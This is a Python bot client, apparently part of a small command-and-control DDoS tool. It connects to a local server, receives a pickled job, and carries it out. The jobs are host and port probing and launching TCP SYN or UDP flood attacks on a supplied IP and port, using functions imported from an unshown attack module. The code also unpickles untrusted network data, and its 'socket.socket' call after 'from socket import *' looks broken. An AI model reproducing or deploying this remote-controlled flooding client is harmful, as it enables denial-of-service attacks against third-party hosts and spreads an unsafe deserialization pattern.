from socket import *
import pickle
import sys
from data import *
from status import *
from attack import *

serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
serverSocket.connect(('127.0.0.1',80))

control = ['ASK']
status = ['JOB_COMPLETED']

def response(serverSocket,msgRecv):
    jobType = msgRecv.jobType
    IP = msgRecv.jobData[0]

    if jobType == 'IS_HOST_ONLINE':
        x = clientData(status[0],isOnline(IP))
        x.msgSize = sys.getsizeof(pickle.dumps(x));
        serverSocket.send(pickle.dumps(x))
    elif jobType == 'PORT_STATUS':
        port = msgRecv.jobData[1]
        x = clientData(status[0],[tcpPortStatus(IP,int(port)),udpPortStatus(IP,int(port))])
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))
    elif  jobType == 'TCP_ATTACK':
        port = int(msgRecv.jobData[1])
        x = clientData(status[0],str('TCP_ATTACK INITIATED'))
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))
        tcpSyn(IP,port)
    elif jobType == 'UDP_ATTACK':
        port = int(msgRecv.jobData[1])
        x = clientData(status[0],str('UDP_ATTACK INITIATED'))
        x.msgSize = sys.getsizeof(pickle.dumps(x))
        serverSocket.send(pickle.dumps(x))
        udpAttack(IP,port)


x = clientData(control[0],'')
x.msgSize = sys.getsizeof(pickle.dumps(x));
serverSocket.send(pickle.dumps(x))
msgRecv = pickle.loads(serverSocket.recv(1024))
print('****JOB RECEIVED FROM SERVER****')
print(msgRecv)
response(serverSocket,msgRecv)
serverSocket.close()
